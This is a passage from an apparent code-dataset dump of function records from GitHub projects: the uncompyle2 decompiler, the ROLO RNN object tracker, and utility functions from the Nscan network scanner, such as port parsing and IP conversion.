JUMP_IF_FALSE_OR_POP, JUMP_IF_TRUE_OR_POP (return 1<2<3 case)\n        if pos < rtarget and code[rtarget] == ROT_TWO:\n            return\n        self.structs.append({'type':  'if-then',\n                               'start': start,\n                               'end':   rtarget})\n        self.return_end_ifs.add(pre[rtarget])", "path": "uncompyle2\\scanner26.py", "repo_name": "Mysterie/uncompyle2", "stars": 625, "license": "None", "language": "python", "size": 783}
{"docstring": "\"\"\"\nIf the name of the formal parameter starts with dot,\nit's a tuple parameter, like this:\n#          def MyFunc(xx, (a,b,c), yy):\n#                  print a, b*2, c*42\nIn byte-code, the whole tuple is assigned to parameter '.1' and\nthen the tuple gets unpacked to 'a', 'b' and 'c'.\n\nSince identifiers starting with a dot are illegal in Python,\nwe can search for the byte-code equivalent to '(a,b,c) = .1'\n\"\"\"\n\n", "func_signal": "def get_tuple_parameter(self, ast, name):\n", "code": "assert ast == 'stmts'\nfor i in range(len(ast)):\n    # search for an assign-statement\n    assert ast[i][0] == 'stmt'\n    node = ast[i][0][0]\n    if node == 'assign' \\\n       and node[0] == ASSIGN_TUPLE_PARAM(name):\n        # okay, this assigns '.n' to something\n        del ast[i]\n        # walk lhs; this\n        # returns a tuple of identifiers as used\n        # within the function definition\n        assert node[1] == 'designator'\n        # if lhs is not a UNPACK_TUPLE (or equiv.),\n        # add parenteses to make this a tuple\n        #if node[1][0] not in ('unpack', 'unpack_list'):\n        return '(' + self.traverse(node[1]) + ')'\n        #return self.traverse(node[1])\nraise Exception(\"Can't find tuple parameter \" + name)", "path": "uncompyle2\\walker.py", "repo_name": "Mysterie/uncompyle2", "stars": 625, "license": "None", "language": "python", "size": 783}
{"docstring": "'''\ncheck validity of the opcode at position I and return a list of opcode to delete\n'''\n", "func_signal": "def getOpcodeToDel(self, i):\n", "code": "opcode = self.code[i]\nopsize = self.op_size(opcode)\n\nif i+opsize >= len(self.code):\n    return None\n\nif opcode == EXTENDED_ARG:\n    raise NotImplementedError\n# modification of some jump structure\nif opcode in (PJIF,PJIT,JA,JF,RETURN_VALUE):\n    toDel = []\n    # del POP_TOP\n    if self.code[i+opsize] == POP_TOP:\n        if self.code[i+opsize] == self.code[i+opsize+1] and self.code[i+opsize] == self.code[i+opsize+2] \\\n        and opcode in (JF,JA) and self.code[i+opsize] != self.code[i+opsize+3]:\n            pass\n        else:\n            toDel += [i+opsize]\n    # conditional tuple (not optimal at all, no good solution...)\n    if self.code[i] == JA and self.code[i+opsize] == POP_TOP \\\n        and self.code[i+opsize+1] == JA and self.code[i+opsize+4] == POP_BLOCK:\n        jmpabs1target = self.get_target(i)\n        jmpabs2target = self.get_target(i+opsize+1)\n        if jmpabs1target == jmpabs2target and self.code[jmpabs1target] == FOR_ITER \\\n        and self.code[jmpabs1target-1] != GET_ITER:\n            destFor = self.get_target(jmpabs1target)\n            if destFor == i+opsize+4:\n                setupLoop = self.last_instr(0, jmpabs1target, SETUP_LOOP)\n                standarFor =  self.last_instr(setupLoop, jmpabs1target, GET_ITER)\n                if standarFor == None: \n                    self.restructJump(jmpabs1target, destFor+self.op_size(POP_BLOCK))\n                    toDel += [setupLoop, i+opsize+1, i+opsize+4]\n                    \n    if len(toDel) > 0:\n        return toDel\n    return None\n# raise_varags not realy handle for the moment\nif opcode == RAISE_VARARGS:\n    if self.code[i+opsize] == POP_TOP:\n        return [i+opsize]\n# modification of list structure\nif opcode == BUILD_LIST:\n    if self.code[i+opsize] == DUP_TOP and self.code[i+opsize+1] in (STORE_NAME,STORE_FAST):\n        # del DUP/STORE_NAME x\n        toDel = [i+opsize,i+opsize+1]\n        nameDel = self.get_argument(i+opsize+1)\n        start = i+opsize+1\n        end = start\n        # del LOAD_NAME x\n        while end < len(self.code):\n            end = self.first_instr(end, len(self.code), (LOAD_NAME,LOAD_FAST))\n            if nameDel == self.get_argument(end):\n                toDel += [end]\n                break\n            if self.code[end] == LOAD_NAME:\n                end += self.op_size(LOAD_NAME)\n            else:\n                end += self.op_size(LOAD_FAST)\n        # log JA/POP_TOP to del and update PJIF\n        while start < end:\n            start = self.first_instr(start, end, (PJIF,PJIT))\n            if start == None: break\n            target = self.get_target(start)\n            if self.code[target] == POP_TOP and self.code[target-3] == JA:\n                toDel += [target, target-3]\n                # update PJIF\n                target = self.get_target(target-3)\n                self.restructJump(start, target)\n            start += self.op_size(PJIF)\n        # del DELETE_NAME x \n        start = end\n        while end < len(self.code):\n            end = self.first_instr(end, len(self.code), (DELETE_NAME,DELETE_FAST))\n            if nameDel == self.get_argument(end):\n                toDel += [end]\n                break\n            if self.code[end] == DELETE_NAME:\n                end += self.op_size(DELETE_NAME)\n            else:\n                end += self.op_size(DELETE_FAST)\n        return toDel\n# for / while struct\nif opcode == SETUP_LOOP:\n    # change join(for..) struct\n    if self.code[i+3] == LOAD_FAST and self.code[i+6] == FOR_ITER: \n        end = self.first_instr(i, len(self.code), RETURN_VALUE)\n        end = self.first_instr(i, end, YIELD_VALUE)\n        if end and self.code[end+1] == POP_TOP and self.code[end+2] == JA and self.code[end+5] == POP_BLOCK:\n            return [i,end+5]\n# with stmt\nif opcode == WITH_CLEANUP:\n    allRot = self.all_instr(0, i, (ROT_TWO))\n    chckRot = -1\n    for rot in allRot:\n        if self.code[rot+1] == LOAD_ATTR and self.code[rot-3] == LOAD_ATTR \\\n            and self.code[rot-4] == DUP_TOP:\n            chckRot = rot\n    assert chckRot > 0\n    toDel = [chckRot-4,chckRot-3,chckRot]\n    chckStp = -1\n    allSetup = self.all_instr(chckRot+1, i, (SETUP_FINALLY))\n    for stp in allSetup:\n        if i == self.get_target(stp):\n            chckStp = stp\n    assert chckStp > 0\n    toDel += [chckStp]\n    chckDel = chckRot+1+self.op_size(self.code[chckRot+1])\n    while chckDel < chckStp-3:\n        toDel += [chckDel]\n        chckDel += self.op_size(self.code[chckDel])\n    if self.code[chckStp-3] in (STORE_NAME,STORE_FAST) and self.code[chckStp+3] in (LOAD_NAME,LOAD_FAST) \\\n        and self.code[chckStp+6] in (DELETE_NAME,DELETE_FAST):\n        toDel += [chckStp-3,chckStp+3,chckStp+6]\n    # SETUP_WITH opcode dosen't exist in 2.6 but is necessary for the grammar\n    self.code[chckRot+1] = JUMP_ABSOLUTE # ugly hack\n    self.restructJump(chckRot+1, i)\n    self.toChange.append(chckRot+1)\n    return toDel\nif opcode == NOP:\n    return [i]\nreturn None", "path": "uncompyle2\\scanner26.py", "repo_name": "Mysterie/uncompyle2", "stars": 625, "license": "None", "language": "python", "size": 783}
{"docstring": "\"\"\"Dump class definition, doc string and class body.\"\"\"\n\n", "func_signal": "def build_class(self, code):\n", "code": "assert type(code) == CodeType\ncode = Code(code, self.scanner, self.currentclass)\n#assert isinstance(code, Code)\n\nindent = self.indent\n#self.print_(indent, '#flags:\\t', int(code.co_flags))\nast = self.build_ast(code._tokens, code._customize)\ncode._tokens = None # save memory\nassert ast == 'stmts'\n\nif ast[0][0] == NAME_MODULE:\n    del ast[0]\n\n# if docstring exists, dump it\nif code.co_consts and code.co_consts[0] != None and ast[0][0] == ASSIGN_DOC_STRING(code.co_consts[0]):\n    self.print_docstring(indent, code.co_consts[0])\n    self.print_()\n    del ast[0]\n\n\n# the function defining a class normally returns locals(); we\n# don't want this to show up in the source, thus remove the node\nif ast[-1][0] == RETURN_LOCALS:\n    del ast[-1] # remove last node\n#else:\n#    print ast[-1][-1]\n\nfor g in find_globals(ast, set()):\n   self.print_(indent, 'global ', g)\n   \nself.gen_source(ast, code._customize)\ncode._tokens = None; code._customize = None # save memory", "path": "uncompyle2\\walker.py", "repo_name": "Mysterie/uncompyle2", "stars": 625, "license": "None", "language": "python", "size": 783}
{"docstring": "'''\nadd/change/delete bytecode for suiting bytecode 2.7\n'''\n# we can't use op_range for the moment\n# convert jump opcode to 2.7\n", "func_signal": "def restructBytecode(self):\n", "code": "self.restructRelativeJump()\n\nlistExp = self.getOpcodeToExp()\n# change code structure \nif listExp:\n    listExp = sorted(list(set(listExp)))\n    self.restructCode([], listExp)\n    # we add arg to expended opcode\n    offset=0\n    for toExp in listExp:\n        self.code.insert(toExp+offset+1, 0)\n        self.code.insert(toExp+offset+1, 0)\n        offset+=2\n# op_range is now ok :)\n# add instruction to change in \"toChange\" list + MAJ toDel\nlistDel = []\nfor i in self.op_range(0, len(self.code)):\n    ret = self.getOpcodeToDel(i)\n    if ret != None:\n        listDel += ret\n\n# change code structure after deleting byte\nif listDel:\n    listDel = sorted(list(set(listDel)))\n    self.restructCode(listDel, [])\n    # finaly we delete useless opcode\n    delta = 0\n    for x in listDel:\n        if self.op_hasArgument(self.code[x-delta]):\n            self.code.pop(x-delta)\n            self.code.pop(x-delta)\n            self.code.pop(x-delta)\n            delta += 3\n        else:\n            self.code.pop(x-delta)\n            delta += 1", "path": "uncompyle2\\scanner26.py", "repo_name": "Mysterie/uncompyle2", "stars": 625, "license": "None", "language": "python", "size": 783}
{"docstring": "'''\nrestruct linestarts and jump destination after converting bytecode\n'''\n# restruct linestarts with deleted / modificated opcode\n", "func_signal": "def restructCode(self, listDel, listExp):\n", "code": "result = list()\nfor block in self.linestarts:\n    startBlock = 0\n    for toDel in listDel:\n        if toDel < block[0]:\n            startBlock -= self.op_size(self.code[toDel])\n    for toExp in listExp:\n        if toExp < block[0]:\n            startBlock += 2\n    result.append((block[0]+startBlock, block[1]))\nself.linestarts = result\n# handle opcodeToChange deplacement\nfor index in xrange(len(self.toChange)):\n    change = self.toChange[index]\n    delta = 0\n    for toDel in listDel:\n        if change > toDel:\n            delta -= self.op_size(self.code[toDel])\n    for toExp in listExp:\n        if change > toExp:\n            delta += 2\n    self.toChange[index] += delta\n# restruct jmp opcode\nif listDel:\n    for jmp in self.op_range(0, len(self.code)):\n        op = self.code[jmp]\n        if op in hasjrel+hasjabs: \n            offset = 0\n            jmpTarget = self.get_target(jmp)\n            for toDel in listDel:\n                if toDel < jmpTarget:\n                    if op in hasjabs or jmp < toDel:\n                        offset-=self.op_size(self.code[toDel])\n            self.restructJump(jmp, jmpTarget+offset)\nif listExp:\n    jmp = 0\n    while jmp < len(self.code): # we can't use op_range for the moment\n        op = self.code[jmp]\n        if op in hasjrel+hasjabs:\n            offset = 0\n            jmpTarget = self.get_target(jmp)\n            for toExp in listExp:\n                if toExp < jmpTarget:\n                    if op in hasjabs or jmp < toExp:\n                        offset+=2\n            self.restructJump(jmp, jmpTarget+offset)\n        if self.op_hasArgument(op) and op not in self.opc.hasArgumentExtended:\n            jmp += 3\n        else: jmp += 1", "path": "uncompyle2\\scanner26.py", "repo_name": "Mysterie/uncompyle2", "stars": 625, "license": "None", "language": "python", "size": 783}
{"docstring": "\"\"\"Get a list of sharded variables with the given dtype.\"\"\"\n", "func_signal": "def _get_sharded_variable(name, shape, dtype, num_shards):\n", "code": "if num_shards > shape[0]:\n  raise ValueError(\"Too many shards: shape=%s, num_shards=%d\" %\n                   (shape, num_shards))\nunit_shard_size = int(math.floor(shape[0] / num_shards))\nremaining_rows = shape[0] - unit_shard_size * num_shards\n\nshards = []\nfor i in range(num_shards):\n  current_size = unit_shard_size\n  if i < remaining_rows:\n    current_size += 1\n  shards.append(vs.get_variable(name + \"_%d\" % i, [current_size] + shape[1:],\n                                dtype=dtype))\nreturn shards", "path": "update\\src\\rnn_cell.py", "repo_name": "Guanghan/ROLO", "stars": 874, "license": "apache-2.0", "language": "python", "size": 112}
{"docstring": "\"\"\"Create a cell with input projection.\n\nArgs:\n  cell: an RNNCell, a projection of inputs is added before it.\n  num_proj: Python integer.  The dimension to project to.\n  input_size: Deprecated and unused.\n\nRaises:\n  TypeError: if cell is not an RNNCell.\n\"\"\"\n", "func_signal": "def __init__(self, cell, num_proj, input_size=None):\n", "code": "if input_size is not None:\n  logging.warn(\"%s: The input_size parameter is deprecated.\", self)\nif not isinstance(cell, RNNCell):\n  raise TypeError(\"The parameter cell is not RNNCell.\")\nself._cell = cell\nself._num_proj = num_proj", "path": "update\\src\\rnn_cell.py", "repo_name": "Guanghan/ROLO", "stars": 874, "license": "apache-2.0", "language": "python", "size": 112}
{"docstring": "#print(\"location in func: \", locations)\n", "func_signal": "def locations_normal(wid, ht, locations):\n", "code": "wid *= 1.0\nht *= 1.0\nlocations[0] *= wid\nlocations[1] *= ht\nlocations[2] *= wid\nlocations[3] *= ht\nreturn locations", "path": "utils\\MOLO_utils.py", "repo_name": "Guanghan/ROLO", "stars": 874, "license": "apache-2.0", "language": "python", "size": 112}
{"docstring": "#print(\"lines length: \", len(lines))\n#print(\"id: \", id)\n", "func_signal": "def find_gt_location(self, lines, id):\n", "code": "line = lines[id]\nelems = line.split('\\t')   # for gt type 2\n#print(elems)\nif len(elems) < 4:\n        elems = line.split(',') #for gt type 1\n        #print(elems)\nx1 = elems[0]\ny1 = elems[1]\nw = elems[2]\nh = elems[3]\ngt_location = [int(x1), int(y1), int(w), int(h)]\nreturn gt_location", "path": "utils\\MOLO_utils.py", "repo_name": "Guanghan/ROLO", "stars": 874, "license": "apache-2.0", "language": "python", "size": 112}
{"docstring": "\"\"\"Most basic RNN: output = new_state = activation(W * input + U * state + B).\"\"\"\n", "func_signal": "def __call__(self, inputs, state, scope=None):\n", "code": "with vs.variable_scope(scope or type(self).__name__):  # \"BasicRNNCell\"\n  output = self._activation(_linear([inputs, state], self._num_units, True))\nreturn output, output", "path": "update\\src\\rnn_cell.py", "repo_name": "Guanghan/ROLO", "stars": 874, "license": "apache-2.0", "language": "python", "size": 112}
{"docstring": "\"\"\"Run the cell with the declared dropouts.\"\"\"\n", "func_signal": "def __call__(self, inputs, state, scope=None):\n", "code": "if (not isinstance(self._input_keep_prob, float) or\n    self._input_keep_prob < 1):\n  inputs = nn_ops.dropout(inputs, self._input_keep_prob, seed=self._seed)\noutput, new_state = self._cell(inputs, state, scope)\nif (not isinstance(self._output_keep_prob, float) or\n    self._output_keep_prob < 1):\n  output = nn_ops.dropout(output, self._output_keep_prob, seed=self._seed)\nreturn output, new_state", "path": "update\\src\\rnn_cell.py", "repo_name": "Guanghan/ROLO", "stars": 874, "license": "apache-2.0", "language": "python", "size": 112}
{"docstring": "\"\"\"Create a SlimRNNCell from a cell_fn.\n\nArgs:\n  cell_fn: a function which takes (inputs, state, scope) and produces the\n    outputs and the new_state. Additionally when called with inputs=None and\n    state=None it should return (initial_outputs, initial_state).\n\nRaises:\n  TypeError: if cell_fn is not callable\n  ValueError: if cell_fn cannot produce a valid initial state.\n\"\"\"\n", "func_signal": "def __init__(self, cell_fn):\n", "code": "if not callable(cell_fn):\n  raise TypeError(\"cell_fn %s needs to be callable\", cell_fn)\nself._cell_fn = cell_fn\nself._cell_name = cell_fn.func.__name__\ninit_output, init_state = self._cell_fn(None, None)\noutput_shape = init_output.get_shape()\nstate_shape = init_state.get_shape()\nself._output_size = output_shape.with_rank(2)[1].value\nself._state_size = state_shape.with_rank(2)[1].value\nif self._output_size is None:\n  raise ValueError(\"Initial output created by %s has invalid shape %s\" %\n                   (self._cell_name, output_shape))\nif self._state_size is None:\n  raise ValueError(\"Initial state created by %s has invalid shape %s\" %\n                   (self._cell_name, state_shape))", "path": "update\\src\\rnn_cell.py", "repo_name": "Guanghan/ROLO", "stars": 874, "license": "apache-2.0", "language": "python", "size": 112}
{"docstring": "#paths = [os.path.join(fold,fn) for fn in next(os.walk(fold))[2]]\n#paths = sorted(paths)\n#path= paths[id]\n", "func_signal": "def find_rolo_location( fold, id):\n", "code": "filename= str(id) + '.npy'\npath= os.path.join(fold, filename)\n#print(path)\nrolo_output = np.load(path)\nreturn rolo_output", "path": "utils\\MOLO_utils.py", "repo_name": "Guanghan/ROLO", "stars": 874, "license": "apache-2.0", "language": "python", "size": 112}
{"docstring": "# Prevent NaN in benchmark results\n", "func_signal": "def iou(box1, box2):\n", "code": "validate_box(box1)\nvalidate_box(box2)\n\n# change float to int, in order to prevent overflow\nbox1 = map(int, box1)\nbox2 = map(int, box2)\n\ntb = min(box1[0]+0.5*box1[2],box2[0]+0.5*box2[2])-max(box1[0]-0.5*box1[2],box2[0]-0.5*box2[2])\nlr = min(box1[1]+0.5*box1[3],box2[1]+0.5*box2[3])-max(box1[1]-0.5*box1[3],box2[1]-0.5*box2[3])\nif tb <= 0 or lr <= 0 :\n    intersection = 0\n    #print \"intersection= 0\"\nelse : intersection =  tb*lr\nreturn intersection / (box1[2]*box1[3] + box2[2]*box2[3] - intersection)", "path": "utils\\MOLO_utils.py", "repo_name": "Guanghan/ROLO", "stars": 874, "license": "apache-2.0", "language": "python", "size": 112}
{"docstring": "\"\"\"Linear map: sum_i(args[i] * W[i]), where W[i] is a variable.\n\nArgs:\n  args: a 2D Tensor or a list of 2D, batch x n, Tensors.\n  output_size: int, second dimension of W[i].\n  bias: boolean, whether to add a bias term or not.\n  bias_start: starting value to initialize the bias; 0 by default.\n  scope: VariableScope for the created subgraph; defaults to \"Linear\".\n\nReturns:\n  A 2D Tensor with shape [batch x output_size] equal to\n  sum_i(args[i] * W[i]), where W[i]s are newly created matrices.\n\nRaises:\n  ValueError: if some of the arguments has unspecified or wrong shape.\n\"\"\"\n", "func_signal": "def _linear(args, output_size, bias, bias_start=0.0, scope=None):\n", "code": "if args is None or (nest.is_sequence(args) and not args):\n  raise ValueError(\"`args` must be specified\")\nif not nest.is_sequence(args):\n  args = [args]\n\n# Calculate the total size of arguments on dimension 1.\ntotal_arg_size = 0\nshapes = [a.get_shape().as_list() for a in args]\nfor shape in shapes:\n  if len(shape) != 2:\n    raise ValueError(\"Linear is expecting 2D arguments: %s\" % str(shapes))\n  if not shape[1]:\n    raise ValueError(\"Linear expects shape[1] of arguments: %s\" % str(shapes))\n  else:\n    total_arg_size += shape[1]\n\ndtype = [a.dtype for a in args][0]\n\n# Now the computation.\nwith vs.variable_scope(scope or \"Linear\"):\n  matrix = vs.get_variable(\n      \"Matrix\", [total_arg_size, output_size], dtype=dtype)\n  if len(args) == 1:\n    res = math_ops.matmul(args[0], matrix)\n  else:\n    res = math_ops.matmul(array_ops.concat(1, args), matrix)\n  if not bias:\n    return res\n  bias_term = vs.get_variable(\n      \"Bias\", [output_size],\n      dtype=dtype,\n      initializer=init_ops.constant_initializer(\n          bias_start, dtype=dtype))\nreturn res + bias_term", "path": "update\\src\\rnn_cell.py", "repo_name": "Guanghan/ROLO", "stars": 874, "license": "apache-2.0", "language": "python", "size": 112}
{"docstring": "# for each element in the batch, find its iou. output a list of ious.\n", "func_signal": "def find_iou_cost(self, pred_locs, gts):\n", "code": "cost = 0\n#batch_size= len(pred_locs)\nbatch_size= self.batch_size\n#assert (len(gts)== batch_size)\n#print(\"gts: \", gts)\n#print(\"batch_size: \", batch_size)\n#print(\"pred_locs: \", pred_locs)\n#ious = []\nious = np.zeros((batch_size, 4))\n\nfor i in range(batch_size):\n        pred_loc = pred_locs[i,:]\n        #print(\"pred_loc[i]: \", pred_loc)\n        gt = gts[i,:]\n        iou_ = self.iou(pred_loc, gt)\n        #ious.append(iou_)\n        #print(\"iou_\", iou_)\n        ious[i,:]= iou_\n#ious= tf.reshape(ious, batch_size)\n#print(\"ious: \", ious)\n'''\navg_iou= 0\nfor i in range(batch_size):\n        pred_loc = pred_locs[i,:]\n        gt= gts[i,:]\n        print(\"gt\", gt)\n        #print(\"pred_loc\", pred_loc)\n        avg_iou += self.iou(pred_loc, gt)\navg_iou /= batch_size\n\nprint(\"avg_iou shape: \", tf.shape(avg_iou)) # single tensor expected\nreturn avg_iou'''\nreturn ious", "path": "utils\\MOLO_utils.py", "repo_name": "Guanghan/ROLO", "stars": 874, "license": "apache-2.0", "language": "python", "size": 112}
{"docstring": "# locations (class, x, y, w, h, prob); (x, y) is the middle pt of the rect\n# gt_location (x1, y1, w, h)\n", "func_signal": "def find_best_location(self, locations, gt_location):\n", "code": "x1 = gt_location[0]\ny1 = gt_location[1]\nw = gt_location[2]\nh = gt_location[3]\ngt_location_revised= [x1 + w/2, y1 + h/2, w, h]\n\nmax_ious= 0\nfor location, id in enumerate(locations):\n        location_revised = location[1:5]\n        ious = self.iou(location_revised, gt_location_revised)\n        if ious >= max_ious:\n                max_ious = ious\n                index = id\nreturn locations[index]", "path": "utils\\MOLO_utils.py", "repo_name": "Guanghan/ROLO", "stars": 874, "license": "apache-2.0", "language": "python", "size": 112}
{"docstring": "\"\"\"Helper function that enables int or TensorShape shape specification.\n\nThis function takes a size specification, which can be an integer or a\nTensorShape, and converts it into a list of integers. One may specify any\nadditional dimensions that precede the final state size specification.\n\nArgs:\n  state_size: TensorShape or int that specifies the size of a tensor.\n  prefix: optional additional list of dimensions to prepend.\n\nReturns:\n  result_state_size: list of dimensions the resulting tensor size.\n\"\"\"\n", "func_signal": "def _state_size_with_prefix(state_size, prefix=None):\n", "code": "result_state_size = tensor_shape.as_shape(state_size).as_list()\nif prefix is not None:\n  if not isinstance(prefix, list):\n    raise TypeError(\"prefix of _state_size_with_prefix should be a list.\")\n  result_state_size = prefix + result_state_size\nreturn result_state_size", "path": "update\\src\\rnn_cell.py", "repo_name": "Guanghan/ROLO", "stars": 874, "license": "apache-2.0", "language": "python", "size": 112}
{"docstring": "\"\"\"Run the cell and output projection on inputs, starting from state.\"\"\"\n", "func_signal": "def __call__(self, inputs, state, scope=None):\n", "code": "output, res_state = self._cell(inputs, state)\n# Default scope: \"OutputProjectionWrapper\"\nwith vs.variable_scope(scope or type(self).__name__):\n  projected = _linear(output, self._output_size, True)\nreturn projected, res_state", "path": "update\\src\\rnn_cell.py", "repo_name": "Guanghan/ROLO", "stars": 874, "license": "apache-2.0", "language": "python", "size": 112}
{"docstring": "\"\"\"Long short-term memory cell (LSTM).\"\"\"\n", "func_signal": "def __call__(self, inputs, state, scope=None):\n", "code": "with vs.variable_scope(scope or type(self).__name__):  # \"BasicLSTMCell\"\n  # Parameters of gates are concatenated into one multiply for efficiency.\n  if self._state_is_tuple:\n    c, h = state\n  else:\n    c, h = array_ops.split(1, 2, state)\n  concat = _linear([inputs, h], 4 * self._num_units, True)\n\n  # i = input_gate, j = new_input, f = forget_gate, o = output_gate\n  i, j, f, o = array_ops.split(1, 4, concat)\n\n  new_c = (c * sigmoid(f + self._forget_bias) + sigmoid(i) *\n           self._activation(j))\n  new_h = self._activation(new_c) * sigmoid(o)\n\n  if self._state_is_tuple:\n    new_state = LSTMStateTuple(new_c, new_h)\n  else:\n    new_state = array_ops.concat(1, [new_c, new_h])\n  return new_h, new_state", "path": "update\\src\\rnn_cell.py", "repo_name": "Guanghan/ROLO", "stars": 874, "license": "apache-2.0", "language": "python", "size": 112}
{"docstring": "# Translate yolo's box mid-point (x0, y0) to top-left point (x1, y1), in order to compare with gt\n", "func_signal": "def cal_yolo_IOU(location, gt_location):\n", "code": "location[0] = location[0] - location[2]/2\nlocation[1] = location[1] - location[3]/2\nloss = iou(location, gt_location)\nreturn loss", "path": "utils\\MOLO_utils.py", "repo_name": "Guanghan/ROLO", "stars": 874, "license": "apache-2.0", "language": "python", "size": 112}
{"docstring": "\"\"\"Gated recurrent unit (GRU) with nunits cells.\"\"\"\n", "func_signal": "def __call__(self, inputs, state, scope=None):\n", "code": "with vs.variable_scope(scope or type(self).__name__):  # \"GRUCell\"\n  with vs.variable_scope(\"Gates\"):  # Reset gate and update gate.\n    # We start with bias of 1.0 to not reset and not update.\n    r, u = array_ops.split(1, 2, _linear([inputs, state],\n                                         2 * self._num_units, True, 1.0))\n    r, u = sigmoid(r), sigmoid(u)\n  with vs.variable_scope(\"Candidate\"):\n    c = self._activation(_linear([inputs, r * state],\n                                 self._num_units, True))\n  new_h = u * state + (1 - u) * c\nreturn new_h, new_h", "path": "update\\src\\rnn_cell.py", "repo_name": "Guanghan/ROLO", "stars": 874, "license": "apache-2.0", "language": "python", "size": 112}
{"docstring": "\"\"\"Run this multi-layer cell on inputs, starting from state.\"\"\"\n", "func_signal": "def __call__(self, inputs, state, scope=None):\n", "code": "with vs.variable_scope(scope or type(self).__name__):  # \"MultiRNNCell\"\n  cur_state_pos = 0\n  cur_inp = inputs\n  new_states = []\n  for i, cell in enumerate(self._cells):\n    with vs.variable_scope(\"Cell%d\" % i):\n      if self._state_is_tuple:\n        if not nest.is_sequence(state):\n          raise ValueError(\n              \"Expected state to be a tuple of length %d, but received: %s\"\n              % (len(self.state_size), state))\n        cur_state = state[i]\n      else:\n        cur_state = array_ops.slice(\n            state, [0, cur_state_pos], [-1, cell.state_size])\n        cur_state_pos += cell.state_size\n      cur_inp, new_state = cell(cur_inp, cur_state)\n      new_states.append(new_state)\nnew_states = (tuple(new_states) if self._state_is_tuple\n              else array_ops.concat(1, new_states))\nreturn cur_inp, new_states", "path": "update\\src\\rnn_cell.py", "repo_name": "Guanghan/ROLO", "stars": 874, "license": "apache-2.0", "language": "python", "size": 112}
{"docstring": "\"\"\"Create a cell with output projection.\n\nArgs:\n  cell: an RNNCell, a projection to output_size is added to it.\n  output_size: integer, the size of the output after projection.\n\nRaises:\n  TypeError: if cell is not an RNNCell.\n  ValueError: if output_size is not positive.\n\"\"\"\n", "func_signal": "def __init__(self, cell, output_size):\n", "code": "if not isinstance(cell, RNNCell):\n  raise TypeError(\"The parameter cell is not RNNCell.\")\nif output_size < 1:\n  raise ValueError(\"Parameter output_size must be > 0: %d.\" % output_size)\nself._cell = cell\nself._output_size = output_size", "path": "update\\src\\rnn_cell.py", "repo_name": "Guanghan/ROLO", "stars": 874, "license": "apache-2.0", "language": "python", "size": 112}
{"docstring": "\"\"\"Create a cell with an added input embedding.\n\nArgs:\n  cell: an RNNCell, an embedding will be put before its inputs.\n  embedding_classes: integer, how many symbols will be embedded.\n  embedding_size: integer, the size of the vectors we embed into.\n  initializer: an initializer to use when creating the embedding;\n    if None, the initializer from variable scope or a default one is used.\n\nRaises:\n  TypeError: if cell is not an RNNCell.\n  ValueError: if embedding_classes is not positive.\n\"\"\"\n", "func_signal": "def __init__(self, cell, embedding_classes, embedding_size, initializer=None):\n", "code": "if not isinstance(cell, RNNCell):\n  raise TypeError(\"The parameter cell is not RNNCell.\")\nif embedding_classes <= 0 or embedding_size <= 0:\n  raise ValueError(\"Both embedding_classes and embedding_size must be > 0: \"\n                   \"%d, %d.\" % (embedding_classes, embedding_size))\nself._cell = cell\nself._embedding_classes = embedding_classes\nself._embedding_size = embedding_size\nself._initializer = initializer", "path": "update\\src\\rnn_cell.py", "repo_name": "Guanghan/ROLO", "stars": 874, "license": "apache-2.0", "language": "python", "size": 112}
{"docstring": "''' check if thread is alive '''\n", "func_signal": "def Alive(thread_list):\n", "code": "alive = False\ni = 0\nwhile True:\n\talive = thread_list[i].isAlive()\n\ti += 1\n\tif alive or i==len(thread_list):\n\t\tbreak\nreturn alive", "path": "stable\\nscan.py", "repo_name": "OffensivePython/Nscan", "stars": 523, "license": "apache-2.0", "language": "python", "size": 489}
{"docstring": "'''\n    Checks if a nscan interface is pre-loaded\n'''\n", "func_signal": "def preloaded(self):\n", "code": "interfaces = open('/etc/network/interfaces', 'r')\ncontent = interfaces.read()\ninterfaces.close()\npattern = self.conf.format(self.ifname, '(.+?)')", "path": "latest\\startup.py", "repo_name": "OffensivePython/Nscan", "stars": 523, "license": "apache-2.0", "language": "python", "size": 489}
{"docstring": "'''\n    Convert byte mac address to XX:XX:XX:XX:XX:XX\n'''\n", "func_signal": "def byte2mac(addr):\n", "code": "mac = ''\nfor b in addr:\n    byte =  hex(ord(b))    # '0xXX', '0xX'\n    byte = byte.replace('x', '')\n    \n    if len(byte)>2:\n        mac += byte[1:] + ':'\n    else:\n        mac += byte + ':'\nreturn mac.strip(':')", "path": "latest\\convert.py", "repo_name": "OffensivePython/Nscan", "stars": 523, "license": "apache-2.0", "language": "python", "size": 489}
{"docstring": "'''ports handler\nparameters:\n    args    -- ports ('21-25,80,443')\nreturns:\n    ports   -- [[21, 25], [80], [443]]\n'''\n", "func_signal": "def Ports(port_list):\n", "code": "port_range = []\nif port_list:\n    ports = port_list.replace(' ', '')\n    ports = ports.split(',')\n    for i in range(len(ports)):\n        ports[i] = ports[i].split('-')\n    for i in ports:\n        if len(i)==1:\n            port_range.append([int(i[0]), int(i[0])+1])\n        else:\n            port_range.append( [ int(i[0]), int(i[1])+1 ] )\nelse:\n    raise SyntaxError('-p, --port=21-25,80,443')\nreturn port_range", "path": "stable\\get.py", "repo_name": "OffensivePython/Nscan", "stars": 523, "license": "apache-2.0", "language": "python", "size": 489}
{"docstring": "''' check if thread is alive '''\n", "func_signal": "def Alive(thread_list):\n", "code": "alive = False\nfor t in thread_list:\n\tif t.isAlive():\n\t\talive = True\n\t\tbreak\nreturn alive", "path": "stable\\probe.py", "repo_name": "OffensivePython/Nscan", "stars": 523, "license": "apache-2.0", "language": "python", "size": 489}
{"docstring": "'''\nconvert ip address from decimal format to dotted-quad format\n'''\n", "func_signal": "def dec2dot(dec):\n", "code": "if dec>0xFFFFFFFF:\n    dec = 0xFFFFFFFF\nip = pack('!L', dec)\nreturn inet_ntoa(ip)", "path": "stable\\convert.py", "repo_name": "OffensivePython/Nscan", "stars": 523, "license": "apache-2.0", "language": "python", "size": 489}
{"docstring": "'''\n    Returns tuple of script name and port numbers\n'''\n", "func_signal": "def Imports(arg):\n", "code": "if arg:\n    imports = {}\n    arg = arg.split('+')\n    for i in range(len(arg)):\n        arg[i] = arg[i].split(':')\n    for i in arg:\n        imports[i[0]] = Ports(i[1])\n    return imports\nelse:\n    return None", "path": "stable\\get.py", "repo_name": "OffensivePython/Nscan", "stars": 523, "license": "apache-2.0", "language": "python", "size": 489}
